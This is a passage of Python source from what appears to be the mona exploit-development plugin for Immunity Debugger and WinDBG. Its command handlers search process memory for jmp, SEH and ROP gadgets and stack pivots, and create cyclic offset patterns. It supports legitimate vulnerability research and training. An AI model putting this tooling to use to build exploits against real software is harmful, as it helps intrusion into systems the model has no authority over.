import getopt
import os
import re
import sys
import types
import random
import shutil
import struct
import string
import types
import urllib
import inspect
import datetime
import binascii
import itertools
import traceback
import pickle
import json
from operator import itemgetter
from collections import defaultdict, namedtuple
import cProfile
import pstats
import copy
import immlib as dbglib
from immlib import LogBpHook
from immutils import *
import time
import pykd
import windbglib as dbglib
from windbglib import LogBpHook
import copy, random, time
import sys
import sys
import traceback
import traceback


def main(args):
    dbg.createLogWindow()
    global currentArgs
    currentArgs = copy.copy(args)
    try:
        starttime = datetime.datetime.now()
        ptr_counter = 0
        commands = {}

        def getBanner():
            banners = {}
            bannertext = ''
            bannertext += '    |------------------------------------------------------------------|\n'
            bannertext += '    |                         __               __                      |\n'
            bannertext += '    |   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n'
            bannertext += '    |  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n'
            bannertext += '    | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n'
            bannertext += '    | \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n'
            bannertext += '    |                                                                  |\n'
            bannertext += '    |     https://www.corelan.be | https://www.corelan-training.com    |\n'
            bannertext += '    |------------------------------------------------------------------|\n'
            banners[0] = bannertext
            bannertext = ''
            bannertext += '    |------------------------------------------------------------------|\n'
            bannertext += '    |        _ __ ___    ___   _ __    __ _     _ __   _   _           |\n'
            bannertext += "    |       | '_ ` _ \\  / _ \\ | '_ \\  / _` |   | '_ \\ | | | |          |\n"
            bannertext += '    |       | | | | | || (_) || | | || (_| | _ | |_) || |_| |          |\n'
            bannertext += '    |       |_| |_| |_| \\___/ |_| |_| \\__,_|(_)| .__/  \\__, |          |\n'
            bannertext += '    |                                          |_|     |___/           |\n'
            bannertext += '    |                                                                  |\n'
            bannertext += '    |------------------------------------------------------------------|\n'
            banners[1] = bannertext
            bannertext = ''
            bannertext += '    |------------------------------------------------------------------|\n'
            bannertext += '    |                                                                  |\n'
            bannertext += '    |    _____ ___  ____  ____  ____ _                                 |\n'
            bannertext += '    |    / __ `__ \\/ __ \\/ __ \\/ __ `/  https://www.corelan.be         |\n'
            bannertext += '    |   / / / / / / /_/ / / / / /_/ /  https://www.corelan-training.com|\n'
            bannertext += '    |  /_/ /_/ /_/\\____/_/ /_/\\__,_/                                   |\n'
            bannertext += '    |                                                                  |\n'
            bannertext += '    |------------------------------------------------------------------|\n'
            banners[2] = bannertext
            bannertext = ''
            bannertext += '\n    .##.....##..#######..##....##....###........########..##....##\n'
            bannertext += '    .###...###.##.....##.###...##...##.##.......##.....##..##..##.\n'
            bannertext += '    .####.####.##.....##.####..##..##...##......##.....##...####..\n'
            bannertext += '    .##.###.##.##.....##.##.##.##.##.....##.....########.....##...\n'
            bannertext += '    .##.....##.##.....##.##..####.#########.....##...........##...\n'
            bannertext += '    .##.....##.##.....##.##...###.##.....##.###.##...........##...\n'
            bannertext += '    .##.....##..#######..##....##.##.....##.###.##...........##...\n\n'
            banners[3] = bannertext
            bannerlist = []
            for i in range(0, len(banners)):
                bannerlist.append(i)
            random.shuffle(bannerlist)
            return banners[bannerlist[0]]

        def procHelp(args):
            dbg.log(("     'mona' - Exploit Development Swiss Army Knife - %s (%sbit)" % (__DEBUGGERAPP__, str(arch))))
            dbg.log(('     Plugin version : %s r%s' % (__VERSION__, __REV__)))
            dbg.log(('     Python version : %s' % getPythonVersion()))
            if (__DEBUGGERAPP__ == 'WinDBG'):
                pykdversion = dbg.getPyKDVersionNr()
                dbg.log(('     PyKD version %s' % pykdversion))
            dbg.log('     Written by Corelan - https://www.corelan.be')
            dbg.log('     Project page : https://github.com/corelan/mona')
            dbg.logLines(getBanner(), highlight=1)
            dbg.log('Global options :')
            dbg.log('----------------')
            dbg.log('You can use one or more of the following global options on any command that will perform')
            dbg.log('a search in one or more modules, returning a list of pointers :')
            dbg.log(' -n                     : Skip modules that start with a null byte. If this is too broad, use')
            dbg.log('                          option -cp nonull instead')
            dbg.log(' -o                     : Ignore OS modules')
            dbg.log(' -p <nr>                : Stop search after <nr> pointers.')
            dbg.log(' -m <module,module,...> : only query the given modules. Be sure what you are doing !')
            dbg.log('                          You can specify multiple modules (comma separated)')
            dbg.log('                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored')
            dbg.log('                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,')
            dbg.log('                          blah or *blah* = contains blah')
            dbg.log(' -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.')
            dbg.log('                          You can use one or more of the following criteria :')
            dbg.log('                          aslr,safeseh,rebase,nx,os')
            dbg.log('                          You can enable or disable a certain criterium by setting it to true or false')
            dbg.log('                          Example :  -cm aslr=true,safeseh=false')
            dbg.log('                          Suppose you want to search for p/p/r in aslr enabled modules, you could call')
            dbg.log('                          !mona seh -cm aslr')
            dbg.log(' -cp <crit,crit,...>    : Apply some criteria to the pointers to return')
            dbg.log('                          Available options are :')
            dbg.log('                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev')
            dbg.log("                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit")
            dbg.log(" -cpb '\\x00\\x01'        : Provide list with bad chars, applies to pointers")
            dbg.log('                          You can use .. to indicate a range of bytes (in between 2 bad chars)')
            dbg.log(' -x <access>            : Specify desired access level of the returning pointers. If not specified,')
            dbg.log('                          only executable pointers will be returned.')
            dbg.log('                          Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *')
            if (not args):
                args = []
            if (len(args) > 1):
                thiscmd = args[1].lower().strip()
                if (thiscmd in commands):
                    dbg.log('')
                    dbg.log(("Usage of command '%s' :" % thiscmd))
                    dbg.log(('%s' % ('-' * (22 + len(thiscmd)))))
                    dbg.logLines(commands[thiscmd].usage)
                    dbg.log('')
                else:
                    aliasfound = False
                    for cmd in commands:
                        if (commands[cmd].alias == thiscmd):
                            dbg.log('')
                            dbg.log(("Usage of command '%s' :" % thiscmd))
                            dbg.log(('%s' % ('-' * (22 + len(thiscmd)))))
                            dbg.logLines(commands[cmd].usage)
                            dbg.log('')
                            aliasfound = True
                    if (not aliasfound):
                        dbg.logLines(('\nCommand %s does not exist. Run !mona to get a list of available commands\n' % thiscmd), highlight=1)
            else:
                dbg.logLines('\nUsage :')
                dbg.logLines('-------\n')
                dbg.log(' !mona <command> <parameter>')
                dbg.logLines('\nAvailable commands and parameters :\n')
                items = commands.items()
                items.sort(key=itemgetter(0))
                for item in items:
                    if (commands[item[0]].usage != ''):
                        aliastxt = ''
                        if (commands[item[0]].alias != ''):
                            aliastxt = (' / ' + commands[item[0]].alias)
                        dbg.logLines(('%s | %s' % (((item[0] + aliastxt) + (' ' * (20 - len((item[0] + aliastxt))))), commands[item[0]].description)))
                dbg.log('')
                dbg.log('Want more info about a given command ?  Run !mona help <command>', highlight=1)
                dbg.log('')
        commands['help'] = MnCommand('help', 'show help', '!mona help [command]', procHelp)

        def procConfig(args):
            showerror = False
            if ((not ('set' in args)) and (not ('get' in args)) and (not ('add' in args))):
                showerror = True
            if ('set' in args):
                if (type(args['set']).__name__.lower() == 'bool'):
                    showerror = True
                else:
                    params = args['set'].split(' ')
                    if (len(params) < 2):
                        showerror = True
            if ('add' in args):
                if (type(args['add']).__name__.lower() == 'bool'):
                    showerror = True
                else:
                    params = args['add'].split(' ')
                    if (len(params) < 2):
                        showerror = True
            if ('get' in args):
                if (type(args['get']).__name__.lower() == 'bool'):
                    showerror = True
                else:
                    params = args['get'].split(' ')
                    if (len(params) < 1):
                        showerror = True
            if showerror:
                dbg.log('Usage :')
                dbg.logLines(configUsage, highlight=1)
                return
            else:
                if ('get' in args):
                    dbg.log('Reading value from configuration file')
                    monaConfig = MnConfig()
                    thevalue = monaConfig.get(args['get'])
                    dbg.log(('Parameter %s = %s' % (args['get'], thevalue)))
                if ('set' in args):
                    dbg.log('Writing value to configuration file')
                    monaConfig = MnConfig()
                    value = args['set'].split(' ')
                    configparam = value[0].strip()
                    dbg.log(('Old value of parameter %s = %s' % (configparam, monaConfig.get(configparam))))
                    configvalue = args['set'][(0 + len(configparam)):len(args['set'])]
                    monaConfig.set(configparam, configvalue)
                    dbg.log(('New value of parameter %s = %s' % (configparam, configvalue)))
                if ('add' in args):
                    dbg.log('Writing value to configuration file')
                    monaConfig = MnConfig()
                    value = args['add'].split(' ')
                    configparam = value[0].strip()
                    dbg.log(('Old value of parameter %s = %s' % (configparam, monaConfig.get(configparam))))
                    configvalue = ((monaConfig.get(configparam).strip() + ',') + args['add'][(0 + len(configparam)):len(args['add'])].strip())
                    monaConfig.set(configparam, configvalue)
                    dbg.log(('New value of parameter %s = %s' % (configparam, configvalue)))

        def procFindJ(args):
            return procFindJMP(args)

        def procFindJMP(args):
            modulecriteria = {}
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            if (inspect.stack()[1][3] == 'procFindJ'):
                dbg.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...", highlight=1)
            criteria = {}
            all_opcodes = {}
            global ptr_to_get
            ptr_to_get = (- 1)
            distancestr = ''
            mindistance = 0
            maxdistance = 0
            showerror = False
            if ('r' in args):
                if (type(args['r']).__name__.lower() == 'bool'):
                    showerror = True
                else:
                    thisreg = args['r'].upper().strip()
                    validregs = dbglib.Registers32BitsOrder
                    if (not (thisreg in validregs)):
                        showerror = True
            else:
                showerror = True
            if ('distance' in args):
                if (type(args['distance']).__name__.lower() == 'bool'):
                    showerror = True
                else:
                    distancestr = args['distance']
                    distanceparts = distancestr.split(',')
                    for parts in distanceparts:
                        valueparts = parts.split('=')
                        if (len(valueparts) > 1):
                            if (valueparts[0].lower() == 'min'):
                                try:
                                    mindistance = int(valueparts[1])
                                except:
                                    mindistance = 0
                            if (valueparts[0].lower() == 'max'):
                                try:
                                    maxdistance = int(valueparts[1])
                                except:
                                    maxdistance = 0
            if (maxdistance < mindistance):
                tmp = maxdistance
                maxdistance = mindistance
                mindistance = tmp
            criteria['mindistance'] = mindistance
            criteria['maxdistance'] = maxdistance
            if showerror:
                dbg.log('Usage :')
                dbg.logLines(jmpUsage, highlight=1)
                return
            else:
                (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
                all_opcodes = findJMP(modulecriteria, criteria, args['r'].lower().strip())
            logfile = MnLog('jmp.txt')
            thislog = logfile.reset()
            processResults(all_opcodes, logfile, thislog)

        def procFindSEH(args):
            modulecriteria = {}
            modulecriteria['safeseh'] = False
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            criteria = {}
            specialcases = {}
            all_opcodes = {}
            global ptr_to_get
            ptr_to_get = (- 1)
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            if ('rop' in args):
                criteria['rop'] = True
            if ('all' in args):
                criteria['all'] = True
                specialcases['maponly'] = True
            else:
                criteria['all'] = False
                specialcases['maponly'] = False
            all_opcodes = findSEH(modulecriteria, criteria)
            logfile = MnLog('seh.txt')
            thislog = logfile.reset()
            processResults(all_opcodes, logfile, thislog, specialcases)

        def procShowMODULES(args):
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            modulestosearch = getModulesToQuery(modulecriteria)
            showModuleTable('', modulestosearch)
            logfile = MnLog('modules.txt')
            thislog = logfile.reset()

        def procFindROPFUNC(args):
            modulecriteria = {}
            modulecriteria['aslr'] = False
            modulecriteria['os'] = False
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            ropfuncs = {}
            ropfuncoffsets = {}
            (ropfuncs, ropfuncoffsets) = findROPFUNC(modulecriteria, criteria)
            dbg.log('[+] Processing pointers to interesting rop functions')
            logfile = MnLog('ropfunc.txt')
            thislog = logfile.reset()
            processResults(ropfuncs, logfile, thislog)
            global silent
            silent = True
            dbg.log('[+] Processing offsets to pointers to interesting rop functions')
            logfile = MnLog('ropfunc_offset.txt')
            thislog = logfile.reset()
            processResults(ropfuncoffsets, logfile, thislog)

        def procStackPivots(args):
            procROP(args, 'stackpivot')

        def procROP(args, mode='all'):
            modulecriteria = {}
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            modulecriteria['os'] = False
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            depth = 6
            maxoffset = 40
            thedistance = 8
            split = False
            fast = False
            sortedprint = False
            endingstr = ''
            endings = []
            technique = ''
            if ('depth' in args):
                if (type(args['depth']).__name__.lower() != 'bool'):
                    try:
                        depth = int(args['depth'])
                    except:
                        pass
            if ('offset' in args):
                if (type(args['offset']).__name__.lower() != 'bool'):
                    try:
                        maxoffset = int(args['offset'])
                    except:
                        pass
            if ('distance' in args):
                if (type(args['distance']).__name__.lower() != 'bool'):
                    try:
                        thedistance = args['distance']
                    except:
                        pass
            if ('split' in args):
                if (type(args['split']).__name__.lower() == 'bool'):
                    split = args['split']
            if ('s' in args):
                if (type(args['s']).__name__.lower() != 'bool'):
                    technique = args['s'].replace("'", '').replace('"', '').strip().lower()
            if ('fast' in args):
                if (type(args['fast']).__name__.lower() == 'bool'):
                    fast = args['fast']
            if ('end' in args):
                if (type(args['end']).__name__.lower() == 'str'):
                    endingstr = args['end'].replace("'", '').replace('"', '').strip()
                    endings = endingstr.split('#')
            if ('f' in args):
                if (args['f'] != ''):
                    criteria['f'] = args['f']
            if ('sort' in args):
                sortedprint = True
            if ('rva' in args):
                criteria['rva'] = True
            if (mode == 'stackpivot'):
                fast = False
                endings = ''
                split = False
            else:
                mode = 'all'
            findROPGADGETS(modulecriteria, criteria, endings, maxoffset, depth, split, thedistance, fast, mode, sortedprint, technique)

        def procJseh(args):
            results = []
            showred = 0
            showall = False
            if ('all' in args):
                showall = True
            nrfound = 0
            dbg.log('-----------------------------------------------------------------------')
            dbg.log('Search for jmp/call dword[ebp/esp+nn] (and other) combinations started ')
            dbg.log('-----------------------------------------------------------------------')
            opcodej = ['ÿT$\x08', 'ÿd$\x08', 'ÿT$\x14', 'ÿT$\x14', 'ÿT$\x1c', 'ÿT$\x1c', 'ÿT$,', 'ÿT$,', 'ÿT$D', 'ÿT$D', 'ÿT$P', 'ÿT$P', 'ÿU\x0c', 'ÿe\x0c', 'ÿU$', 'ÿe$', 'ÿU0', 'ÿe0', 'ÿUü', 'ÿeü', 'ÿUô', 'ÿeô', 'ÿUè', 'ÿeè', '\x83Ä\x08Ã', '\x83Ä\x08Â']
            fakeptrcriteria = {}
            fakeptrcriteria['accesslevel'] = '*'
            for opjc in opcodej:
                addys = []
                addys = searchInRange([[opjc, opjc]], 0, TOP_USERLAND, fakeptrcriteria)
                results += addys
                for ptrtypes in addys:
                    for ad1 in addys[ptrtypes]:
                        ptr = MnPointer(ad1)
                        module = ptr.belongsTo()
                        if (not module):
                            module = ''
                            page = dbg.getMemoryPageByAddress(ad1)
                            access = page.getAccess(human=True)
                            op = dbg.disasm(ad1)
                            opstring = op.getDisasm()
                            dbg.log(('Found %s at 0x%08x - Access: (%s) - Outside of a loaded module' % (opstring, ad1, access)), address=ad1, highlight=1)
                            nrfound += 1
                        elif showall:
                            page = dbg.getMemoryPageByAddress(ad1)
                            access = page.getAccess(human=True)
                            op = dbg.disasm(ad1)
                            opstring = op.getDisasm()
                            thismod = MnModule(module)
                            if (not thismod.isSafeSEH):
                                extratext = '=== Safeseh : NO ==='
                                showred = 1
                            else:
                                extratext = 'Safeseh protected'
                                showred = 0
                            dbg.log(('Found %s at 0x%08x (%s) - Access: (%s) - %s' % (opstring, ad1, module, access, extratext)), address=ad1, highlight=showred)
                            nrfound += 1
            dbg.log('Search complete')
            if results:
                dbg.log(('Found %d address(es)' % nrfound))
                return ('Found %d address(es) (Check the log Windows for details)' % nrfound)
            else:
                dbg.log('No addresses found')
                return 'Sorry, no addresses found'

        def procJOP(args, mode='all'):
            modulecriteria = {}
            modulecriteria['aslr'] = False
            modulecriteria['rebase'] = False
            modulecriteria['os'] = False
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            depth = 6
            if ('depth' in args):
                if (type(args['depth']).__name__.lower() != 'bool'):
                    try:
                        depth = int(args['depth'])
                    except:
                        pass
            findJOPGADGETS(modulecriteria, criteria, depth)

        def procCreatePATTERN(args):
            size = 0
            pattern = ''
            if (('?' in args) and (args['?'] != '')):
                try:
                    if ('0x' in args['?'].lower()):
                        try:
                            size = int(args['?'], 16)
                        except:
                            size = 0
                    else:
                        size = int(args['?'])
                except:
                    size = 0
            if (size == 0):
                dbg.log('Please enter a valid size', highlight=1)
            else:
                pattern = createPattern(size, args)
                dbg.log(('Creating cyclic pattern of %d bytes' % size))
                dbg.log(pattern)
                global ignoremodules
                ignoremodules = True
                objpatternfile = MnLog('pattern.txt')
                patternfile = objpatternfile.reset()
                objpatternfile.write((('\nPattern of ' + str(size)) + ' bytes :\n'), patternfile)
                objpatternfile.write(('-' * (19 + len(str(size)))), patternfile)
                objpatternfile.write('\nASCII:', patternfile)
                objpatternfile.write(('\n' + pattern), patternfile)
                patternhex = ''
                for patternchar in pattern:
                    patternhex += str(hex(ord(patternchar))).replace('0x', '\\x')
                objpatternfile.write('\n\nHEX:\n', patternfile)
                objpatternfile.write(patternhex, patternfile)
                patternjs = str2js(pattern)
                objpatternfile.write('\n\nJAVASCRIPT (unescape() friendly):\n', patternfile)
                objpatternfile.write(patternjs, patternfile)
                if (not silent):
                    dbg.log("Note: don't copy this pattern from the log window, it might be truncated !", highlight=1)
                    dbg.log(("It's better to open %s and copy the pattern from the file" % patternfile), highlight=1)
                ignoremodules = False
            return

        def procOffsetPATTERN(args):
            egg = ''
            if (('?' in args) and (args['?'] != '')):
                try:
                    egg = args['?']
                except:
                    egg = ''
            if (egg == ''):
                dbg.log('Please enter a valid target', highlight=1)
            else:
                findOffsetInPattern(egg, (- 1), args)
            return

        def procFileCOMPARE(args):
            modulecriteria = {}
            criteria = {}
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            allfiles = []
            tomatch = ''
            checkstrict = True
            rangeval = 0
            fast = False
            if (('ptronly' in args) or ('ptrsonly' in args)):
                fast = True
            if ('f' in args):
                if (args['f'] != ''):
                    rawfilenames = args['f'].replace('"', '')
                    allfiles = [getAbsolutePath(f) for f in rawfilenames.split(',')]
                    dbg.log(('[+] Number of files to be examined : %d ' % len(allfiles)))
            if ('range' in args):
                if (not (type(args['range']).__name__.lower() == 'bool')):
                    strrange = args['range'].lower()
                    if (strrange.startswith('0x') and (len(strrange) > 2)):
                        rangeval = int(strrange, 16)
                    else:
                        try:
                            rangeval = int(args['range'])
                        except:
                            rangeval = 0
                    if (rangeval > 0):
                        dbg.log(('[+] Find overlap using pointer +/- range, value %d' % rangeval))
                        dbg.log('    Note : this will significantly slow down the comparison process !')
                else:
                    dbg.log('Please provide a numeric value ^(> 0) with option -range', highlight=1)
                    return
            else:
                if ('contains' in args):
                    if (type(args['contains']).__name__.lower() == 'str'):
                        tomatch = args['contains'].replace("'", '').replace('"', '')
                if ('nostrict' in args):
                    if (type(args['nostrict']).__name__.lower() == 'bool'):
                        checkstrict = (not args['nostrict'])
                        dbg.log(('[+] Instructions must match in all files ? %s' % checkstrict))
            callfiles = allfiles
            allfiles = []
            for tfile in callfiles:
                if os.path.isdir(tfile):
                    for (root, dirs, files) in os.walk(tfile):
                        for dfile in files:
                            allfiles.append(os.path.join(root, dfile))
                else:
                    allfiles.append(tfile)
            if (len(allfiles) > 1):
                findFILECOMPARISON(modulecriteria, criteria, allfiles, tomatch, checkstrict, rangeval, fast)
            else:
                dbg.log('Please specify at least 2 filenames to compare', highlight=1)

        def procFind(args):
            modulecriteria = {}
            criteria = {}
            pattern = ''
            base = 0
            offset = 0
            top = TOP_USERLAND
            consecutive = False
            ftype = ''
            level = 0
            offsetlevel = 0
            if (not ('a' in args)):
                args['a'] = '*'
            ptronly = False
            if (('ptronly' in args) or ('ptrsonly' in args)):
                ptronly = True
            if (not ('x' in args)):
                args['x'] = '*'
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            if (criteria['accesslevel'] == ''):
                return
            if (not ('s' in args)):
                dbg.log('-s <search pattern (or filename)> is a mandatory argument', highlight=1)
                return
            pattern = args['s']
            if ('unicode' in args):
                criteria['unic'] = True
            if ('b' in args):
                try:
                    base = int(args['b'], 16)
                except:
                    dbg.log(('invalid base address: %s' % args['b']), highlight=1)
                    return
            if ('t' in args):
                try:
                    top = int(args['t'], 16)
                except:
                    dbg.log(('invalid top address: %s' % args['t']), highlight=1)
                    return
            if ('offset' in args):
                if (not (args['offset'].__class__.__name__ == 'bool')):
                    if ('0x' in args['offset'].lower()):
                        try:
                            offset = (0 - int(args['offset'], 16))
                        except:
                            dbg.log('invalid offset value', highlight=1)
                            return
                    else:
                        try:
                            offset = (0 - int(args['offset']))
                        except:
                            dbg.log('invalid offset value', highlight=1)
                            return
                else:
                    dbg.log('invalid offset value', highlight=1)
                    return
            if ('level' in args):
                try:
                    level = int(args['level'])
                except:
                    dbg.log('invalid level value', highlight=1)
                    return
            if ('offsetlevel' in args):
                try:
                    offsetlevel = int(args['offsetlevel'])
                except:
                    dbg.log('invalid offsetlevel value', highlight=1)
                    return
            if ('c' in args):
                dbg.log('    - Skipping consecutive pointers, showing size instead')
                consecutive = True
            if ('type' in args):
                if (not (args['type'] in ['bin', 'asc', 'ptr', 'instr', 'file'])):
                    dbg.log(('Invalid search type : %s' % args['type']), highlight=1)
                    return
                ftype = args['type']
                if (ftype == 'file'):
                    filename = args['s'].replace('"', '').replace("'", '')
                    if (not os.path.isfile(filename)):
                        dbg.log(('Unable to find/read file %s' % filename), highlight=1)
                        return
            rangep2p = 0
            if (('p2p' in args) or (level > 0)):
                dbg.log('    - Looking for pointers to pointers')
                criteria['p2p'] = True
                if ('r' in args):
                    try:
                        rangep2p = int(args['r'])
                    except:
                        pass
                    if (rangep2p > 0):
                        dbg.log(('    - Will search for close pointers (%d bytes backwards)' % rangep2p))
                if ('p2p' in args):
                    level = 1
            if (level > 0):
                dbg.log(('    - Recursive levels : %d' % level))
            allpointers = findPattern(modulecriteria, criteria, pattern, ftype, base, top, consecutive, rangep2p, level, offset, offsetlevel)
            logfile = MnLog('find.txt')
            thislog = logfile.reset()
            processResults(allpointers, logfile, thislog, {}, ptronly)
            return

        def procFindWild(args):
            modulecriteria = {}
            criteria = {}
            pattern = ''
            patterntype = ''
            base = 0
            top = TOP_USERLAND
            (modulecriteria, criteria) = args2criteria(args, modulecriteria, criteria)
            if (not ('s' in args)):
                dbg.log('-s <search pattern (or filename)> is a mandatory argument', highlight=1)
                return
            pattern = args['s']
            patterntypes = ['bin', 'str']
            if ('type' in args):
                if (type(args['type']).__name__.lower() != 'bool'):
                    if (args['type'] in patterntypes):
                        patterntype = args['type']
                    else:
                        dbg.log(('-type argument only takes one of these values: %s' % patterntypes), highlight=1)
                        return
                else:
                    dbg.log(('Please specify a valid value for -type. Valid values are %s' % patterntypes), highlight=1)
                    return
            if (patterntype == ''):
                if ('\\x' in pattern):
                    patterntype = 'bin'
                else:
                    patterntype = 'str'
            if ('b' in args):
                (base, addyok) = getAddyArg(args['b'])
                if (not addyok):
                    dbg.log(('invalid base address: %s' % args['b']), highlight=1)
                    return
            if ('t' in args):
                (top, addyok) = getAddyArg(args['t'])
                if (not addyok):
                    dbg.log(('invalid top address: %s' % args['t']), highlight=1)
                    return
            if ('depth' in args):
                try:
                    criteria['depth'] = int(args['depth'])
                except:
                    dbg.log('invalid depth value', highlight=1)
                    return
            if ('all' in args):
                criteria['all'] = True
            if ('distance' in args):
                if (type(args['distance']).__name__.lower() == 'bool'):
                    dbg.log('invalid distance value(s)', highlight=1)
                else:
                    distancestr = args['distance']
                    distanceparts = distancestr.split(',')
                    for parts in distanceparts:
                        valueparts = parts.split('=')
                        if (len(valueparts) > 1):
                            if (valueparts[0].lower() == 'min'):
                                try:
                                    mindistance = int(valueparts[1])
                                except:
                                    mindistance = 0
                            if (valueparts[0].lower() == 'max'):
                                try:
                                    maxdistance = int(valueparts[1])
                                except:
                                    maxdistance = 0
                if (maxdistance < mindistance):
                    tmp = maxdistance
                    maxdistance = mindistance
                    mindistance = tmp
                criteria['mindistance'] = mindistance
                criteria['maxdistance'] = maxdistance
            allpointers = findPatternWild(modulecriteria, criteria, pattern, base, top, patterntype)
            logfile = MnLog('findwild.txt')
            thislog = logfile.reset()
            processResults(allpointers, logfile, thislog)
            return

        def procAssemble(args):
            opcodes = ''
            encoder = ''
            if (not ('s' in args)):
                dbg.log('Mandatory argument -s <opcodes> missing', highlight=1)
                return
            opcodes = args['s']
            if ('e' in args):
                dbg.log('Encoder support not yet implemented', highlight=1)
                return
                encoder = args['e'].lowercase()
                if (encoder not in ['ascii']):
                    dbg.log(('Invalid encoder : %s' % encoder), highlight=1)
                    return
            assemble(opcodes, encoder)

        def procInfo(args):
            if (not ('a' in args)):
                dbg.log('Missing mandatory argument -a', highlight=1)
                return
            (address, addyok) = getAddyArg(args['a'])
            if (not addyok):
                dbg.log(('%s is an invalid address' % args['a']), highlight=1)
                return
            ptr = MnPointer(address)
            modname = ptr.belongsTo()
            modinfo = None
            if (modname != ''):
                modinfo = MnModule(modname)
            rebase = ''
            rva = 0
            if modinfo:
                rva = (address - modinfo.moduleBase)
            procFlags(args)
            dbg.log('')
            dbg.log(('[+] Information about address 0x%s' % toHex(address)))
            dbg.log(('    %s' % ptr.__str__()))
            thepage = dbg.getMemoryPageByAddress(address)
            dbg.log(('    Address is part of page 0x%08x - 0x%08x' % (thepage.getBaseAddress(), (thepage.getBaseAddress() + thepage.getSize()))))
            section = ''
            try:
                section = thepage.getSection()
            except:
                section = ''
            if (section != ''):
                dbg.log(('    Section : %s' % section))
            if ptr.isOnStack():
                stacks = getStacks()
                stackref = ''
                for tid in stacks:
                    currstack = stacks[tid]
                    if ((currstack[0] <= address) and (address <= currstack[1])):
                        stackref = (' (Thread 0x%08x, Stack Base : 0x%08x, Stack Top : 0x%08x)' % (tid, currstack[0], currstack[1]))
                        break
                dbg.log(('    This address is in a stack segment %s' % stackref))
            if modinfo:
                dbg.log('    Address is part of a module:')
                dbg.log(('    %s' % modinfo.__str__()))
                if (rva != 0):
                    dbg.log(('    Offset from module base: 0x%x' % rva))
                    if modinfo:
                        eatlist = modinfo.getEAT()
                        if (address in eatlist):
                            dbg.log(("    Address is start of function '%s' in %s" % (eatlist[address], modname)))
                        else:
                            iatlist = modinfo.getIAT()
                            if (address in iatlist):
                                iatentry = iatlist[address]
                                dbg.log(("    Address is part of IAT, and contains pointer to '%s'" % iatentry))
            else:
                output = ''
                if ptr.isInHeap():
                    dbg.log('    This address resides in the heap')
                    dbg.log('')
                    ptr.showHeapBlockInfo()
                else:
                    dbg.log('    Module: None')
            try:
                dbg.log('')
                dbg.log('[+] Disassembly:')
                op = dbg.disasm(address)
                opstring = getDisasmInstruction(op)
                dbg.log(('    Instruction at %s : %s' % (toHex(address), opstring)))
            except:
                pass
            if (__DEBUGGERAPP__ == 'WinDBG'):
                dbg.log('')
                dbg.log(('Output of !address 0x%08x:' % address))
                output = dbg.nativeCommand(('!address 0x%08x' % address))
                dbg.logLines(output)
            dbg.log('')

        def procDump(args):
            filename = ''
            if ('f' not in args):
                dbg.log('Missing mandatory argument -f filename', highlight=1)
                return
            filename = args['f']
            address = None
            if ('s' not in args):
                dbg.log('Missing mandatory argument -s address', highlight=1)
                return
            startaddress = str(args['s']).replace('0x', '').replace('0X', '')
            if (not isAddress(startaddress)):
                dbg.log('You have specified an invalid start address', highlight=1)
                return
            address = addrToInt(startaddress)
            size = 0
            if ('n' in args):
                size = int(args['n'])
            elif ('e' in args):
                endaddress = str(args['e']).replace('0x', '').replace('0X', '')
                if (not isAddress(endaddress)):
                    dbg.log('You have specified an invalid end address', highlight=1)
                    return
                end = addrToInt(endaddress)
                if (end < address):
                    dbg.log(('end address %s is before start address %s' % (args['e'], args['s'])), highlight=1)
                    return
                size = (end - address)
            else:
                dbg.log('you need to specify either the size of the copy with -n or the end address with -e ', highlight=1)
                return
            dumpMemoryToFile(address, size, filename)

        def procCompare(args):
            startpos = 0
            filename = ''
            skipmodules = False
            findunicode = False
            allregs = dbg.getRegs()
            if ('f' in args):
                filename = getAbsolutePath(args['f'].replace('"', '').replace("'", ''))
                if (not os.path.isfile(filename)):
                    dbg.log(('Unable to find/read file %s' % filename), highlight=1)
                    return
            else:
                dbg.log('You must specify a valid filename using parameter -f', highlight=1)
                return
            if ('a' in args):
                (startpos, addyok) = getAddyArg(args['a'])
                if (not addyok):
                    dbg.log(('%s is an invalid address' % args['a']), highlight=1)
                    return
            if ('s' in args):
                skipmodules = True
            if ('unicode' in args):
                findunicode = True
            if ('t' in args):
                format = args['t']
            else:
                format = None
            compareFormattedFileWithMemory(filename, format, startpos, skipmodules, findunicode)

        def procOffset(args):
            extratext1 = ''
            extratext2 = ''
            isReg_a1 = False
            isReg_a2 = False
            regs = dbg.getRegs()
            if ('a1' not in args):
                dbg.log('Missing mandatory argument -a1 <address>', highlight=1)
                return
            a1 = args['a1']
            if ('a2' not in args):
                dbg.log('Missing mandatory argument -a2 <address>', highlight=1)
                return
            a2 = args['a2']
            (a1, addyok) = getAddyArg(args['a1'])
            if (not addyok):
                dbg.log(('0x%08x is not a valid address' % a1), highlight=1)
                return
            (a2, addyok) = getAddyArg(args['a2'])
            if (not addyok):
                dbg.log(('0x%08x is not a valid address' % a2), highlight=1)
                return
            diff = (a2 - a1)
            result = toHex(diff)
            negjmpbytes = ''
            if (a1 > a2):
                ndiff = (a1 - a2)
